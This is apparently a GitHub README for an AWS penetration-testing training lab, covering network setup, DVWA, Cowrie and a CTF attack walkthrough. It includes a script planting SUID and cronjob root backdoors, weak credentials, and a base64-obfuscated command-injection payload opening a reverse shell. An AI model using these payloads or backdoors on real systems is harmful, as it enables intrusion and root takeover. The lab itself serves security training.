# AWS-Penetration-Testing-Lab
Create a vulnerable cloud environment on AWS, simulate attacks using Kali Linux tools, identify security flaws, then harden and secure the environment using AWS-native services.
![Pentest-lab](https://github.com/user-attachments/assets/7d1bc252-44ac-433d-a33b-912193541ebb)

## 🎯 Lab Objectives

- Simulate real-world attack scenarios on a segmented AWS network
- Practice enumeration, exploitation, and privilege escalation
- Learn pivoting and lateral movement within cloud environments
- Deploy and interact with honeypots (e.g., Cowrie)

## ⚙️ Prerequisites

- AWS Account with permissions to create VPC, EC2, Security Groups, Route Tables
- Basic knowledge of:
  - Linux networking
  - AWS EC2 and networking
  - Penetration testing concepts
- Recommended Tools on Attacker Box (Kali):
  - netcat
  - nmap
  - hydra
  - chisel
  - proxychains
  - linPEAS

## 📚 Table of Contents
1. [Network Architecture](#-network-architecture)
2. [Routing](#-routing)
3. [Security Groups](#-security-groups)
4. [Lab Machines Overview](#-lab-machines-overview)
5. [DVWA Server Configuration](#-dvwa-server-configuration)
6. [Internal Server Configuration](#-internal-server-configuration)
7. [CTF Privilege Escalation Setup](#-ctf-privilege-escalation-setup)
8. [Next Steps: Attacking](#-next-steps-attacking)

## 📱 Network Architecture

| Component         | CIDR / Info         | Purpose                     |
|------------------|---------------------|-----------------------------|
| VPC              | 10.0.0.0/16         | Isolated Pentest Lab        |
| Attacker-subnet  | 10.0.1.0/24         | Kali Linux Attacker         |
| Target-subnet    | 10.0.2.0/24         | DVWA Vulnerable App         |
| Private-subnet   | 10.0.3.0/24         | Internal Hardened Server    |

## 🌐 Routing

- **public-route-table** (for attacker + target):
  - Route: `0.0.0.0/0` → Internet Gateway (`pentest-lab-igw`)
- **private-route-table** (for internal-server):
  - No route to Internet (air-gapped after setup)

## 🔐 Security Groups

### 🛡️ Attacker-sg
| Rule Type | Protocol | Port Range | Source         | Purpose                           |
|-----------|----------|------------|----------------|-----------------------------------|
| SSH       | TCP      | 22         | 0.0.0.0/0      | Remote access to Kali             |
| All TCP   | TCP      | 0-65535    | 10.0.0.0/16    | Full comms in VPC                 |
| HTTP      | TCP      | 80         | 0.0.0.0/0      | Hosting files                     |
| Custom    | TCP      | 4444       | 10.0.2.0/24    | Netcat reverse shell listener     |
| Custom    | TCP      | 8000       | 10.0.2.0/24    | chisel/proxy listener             |
| ICMP      | ICMP     | All        | 10.0.0.0/16    | Ping across VPC                   |
| All       | All      | All        | 0.0.0.0/0      | Default outbound rule             |

### 🧱 Target-sg
| Rule Type | Protocol | Port Range | Source         | Purpose                         |
|-----------|----------|------------|----------------|---------------------------------|
| SSH       | TCP      | 22         | x.x.x.x/32     | Admin SSH (restricted)          |
| SSH       | TCP      | 22         | 10.0.1.0/24    | Attacker to Target              |
| HTTP      | TCP      | 80         | 0.0.0.0/0      | DVWA Web App                    |
| Custom    | TCP      | 4444       | 10.0.1.0/24    | Reverse Shell                   |
| ICMP      | ICMP     | All        | 10.0.1.0/24    | Ping from Attacker              |
| All       | All      | All        | 0.0.0.0/0      | Default outbound rule           |

### 🔒 Private-sg (Internal-Server)
| Rule Type | Protocol | Port Range | Source         | Purpose                        |
|-----------|----------|------------|----------------|--------------------------------|
| SSH       | TCP      | 22         | 10.0.2.0/24    | Cowrie Honeypot                |
| SSH       | TCP      | 2222       | 10.0.2.0/24    | Cowrie Honeypot                |
| SSH       | TCP      | 22222      | 10.0.2.0/24    | Real SSH                       |
| MySQL     | TCP      | 3306       | 10.0.2.0/24    | Internal DB access             |
| ICMP      | ICMP     | All        | 10.0.2.0/24    | Internal ping                  |
| All       | All      | All        | 0.0.0.0/0      | Default outbound rule          |

## 🧪 Lab Machines Overview

| Role              | Hostname        | Private IP     | Public IP         |
|-------------------|------------------|----------------|--------------------|
| Kali Attacker     | kali             | 10.0.1.x        | Elastic IP assigned |
| DVWA Target       | dvwa-server      | 10.0.2.x        | Elastic IP assigned |
| Internal Server   | internal-server  | 10.0.3.x        | None               |

## 🛠️ DVWA Server Configuration

```bash
sudo apt update && sudo apt upgrade -y
sudo apt install apache2 mariadb-server php php-mysqli git -y

git clone https://github.com/digininja/DVWA.git /var/www/html/dvwa
sudo chown -R www-data:www-data /var/www/html/dvwa
sudo chmod -R 755 /var/www/html/dvwa

sudo mysql -u root
CREATE DATABASE dvwa;
CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';
FLUSH PRIVILEGES;
EXIT;

cp /var/www/html/dvwa/config/config.inc.php.dist /var/www/html/dvwa/config/config.inc.php
nano /var/www/html/dvwa/config/config.inc.php
# Set:
$_DVWA[ 'db_user' ] = 'dvwa';
$_DVWA[ 'db_password' ] = 'password';

sudo systemctl restart apache2
```

## 🛠️ Internal Server Configuration

```bash
sudo apt update && sudo apt install mysql-server -y

sudo mysql
ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'toor';
FLUSH PRIVILEGES;
exit

sudo nano /etc/mysql/mysql.conf.d/mysqld.cnf
# Set:
bind-address = 0.0.0.0

sudo systemctl restart mysql

sudo mysql -u root -p
CREATE USER 'dvwa'@'%' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON *.* TO 'dvwa'@'%';
FLUSH PRIVILEGES;
exit

echo "FLAG{internal-access-compromised}" | sudo tee /root/flag.txt
sudo chmod 600 /root/flag.txt

sudo mysql -u root -p
CREATE DATABASE dvwa;
CREATE USER 'dvwa'@'%' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'%';
FLUSH PRIVILEGES;
exit

echo "flag{you_pivoted_correctly}" | sudo tee /root/super_secret_flag.txt
```
## 🐍 Setup Cowrie Honeypot

Cowrie is a medium-interaction SSH honeypot that logs brute-force attacks and command interactions.

Cowrie listens on:
- Port 22 and 2222 (via iptables and `authbind`)
- Real SSH was moved to 22222

```bash
sudo apt install -y git python3 python3-pip python3-virtualenv libssl-dev libffi-dev build-essential libpython3-dev authbind
sudo adduser --disabled-password --gecos "" cowrie
sudo su - cowrie
git clone https://github.com/cowrie/cowrie.git
cd cowrie
virtualenv cowrie-env
source cowrie-env/bin/activate
pip install -r requirements.txt
cp etc/cowrie.cfg.dist etc/cowrie.cfg
nano etc/cowrie.cfg
# [honeypot] hostname = ip-10-0-3-129

# Authbind for low-port
sudo touch /etc/authbind/byport/22
sudo chown cowrie:cowrie /etc/authbind/byport/22
sudo chmod 755 /etc/authbind/byport/22

# Start Honeypot
authbind --deep ./bin/cowrie start

# Configure Cowrie SSH to listen on port 2222
nano ~/cowrie/etc/cowrie.cfg
# listen_endpoints = tcp:2222:interface=0.0.0.0

# Reroute Port 22 to Cowrie (NAT)
sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
```

## 🎯 CTF Privilege Escalation Setup

```bash
#!/bin/bash

# World-Writable SUID Binary
sudo echo -e '#!/bin/bash\n/bin/bash' > /tmp/rootme
sudo chmod +x /tmp/rootme
sudo cp /tmp/rootme /usr/local/bin/rootme
sudo chown root:root /usr/local/bin/rootme
sudo chmod 4777 /usr/local/bin/rootme

# Cronjob Privilege Escalation
sudo echo -e '#!/bin/bash\nchmod +s /bin/bash' > /tmp/pwn.sh
sudo chmod +x /tmp/pwn.sh
if ! grep -q "/tmp/pwn.sh" /etc/crontab; then
    sudo echo "*/1 * * * * root /tmp/pwn.sh" >> /etc/crontab
fi

# SUID Vim
sudo cp /usr/bin/vim /usr/local/bin/vimroot
sudo chown root:root /usr/local/bin/vimroot
sudo chmod 4755 /usr/local/bin/vimroot
```

### 🛠️ Vulnerabilities Introduced
| Type               | Location                     | Exploitability         |
|--------------------|------------------------------|------------------------|
| World-Writable SUID| `/usr/local/bin/rootme`      | `bash -p`              |
| Cronjob Backdoor   | `/tmp/pwn.sh` via `/etc/crontab` | Scheduled root shell |
| SUID Vim           | `/usr/local/bin/vimroot`     | `:!/bin/bash` in Vim   |


## 🧰 Tools Used
- **Kali Linux** – Offensive security tools and attack platform
- **DVWA** – Vulnerable PHP/MySQL web application
- **Cowrie** – SSH honeypot to capture unauthorized access
- **Netcat, Nmap, Hydra, ProxyChains, Chisel** – Enumeration, reverse shells, tunneling
- **LinPEAS, Linux Exploit Suggester** – Privilege escalation enumeration

## 🚀 Attacking the Lab

### 🔍 Step 1: Reconnaissance
Performed from the Kali instance:
```bash
nmap -sV -T4 -p- 18.246.218.175
```
- Discovered open ports: 22 (SSH), 80 (HTTP)
- Web app discovered: `http://<DVWA SERVER Public IP>/dvwa`

### 🌐 Step 2: Web Vulnerability Scanning
- Set DVWA security level to `low`
- Tools used:
  - Nikto
  - Command Injection module in DVWA

### 🧠 Step 3: Command Injection to Reverse Shell
Executed:
```bash
127.0.0.1; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjEuNzgvNDQ0NCAwPiYxCg== | base64 -d | bash
```
- Shell received in netcat listener:
```bash
nc -lvnp 4444
```
- Reverse shell as `www-data`

### 🛠️ Step 4: Privilege Escalation on DVWA
- Exploited SUID binary `/usr/local/bin/rootme`:
```bash
/usr/local/bin/rootme -p
bash -p
whoami  # root
```

### 🔁 Step 5: Internal Network Scanning from DVWA
- Scanned `10.0.3.129` (Internal Server):
```bash
nmap -sS -sV -T4 10.0.3.129
```
- Open ports found:
  - 22, 2222 → Cowrie honeypot
  - 22222 → Real SSH
  - 3306 → MySQL

## 📢 Notes

⚠️ **Note:**

- MySQL on the internal server is intentionally left open to the 10.0.2.0/24 subnet with minimal protection for training purposes only. Do not expose similar configurations in production environments.
- Vulnerabilities like world-writable SUID binaries, cronjobs, and SUID vim were **intentionally added to the DVWA server** to mimic CTF-style challenges.


## 🧾 License

This project is for educational purposes only. Use responsibly.

## 👤 Author

- Andrew Oppong-Asante
- GitHub: [Andrew-Opp](https://github.com/Andrew-Opp)

---

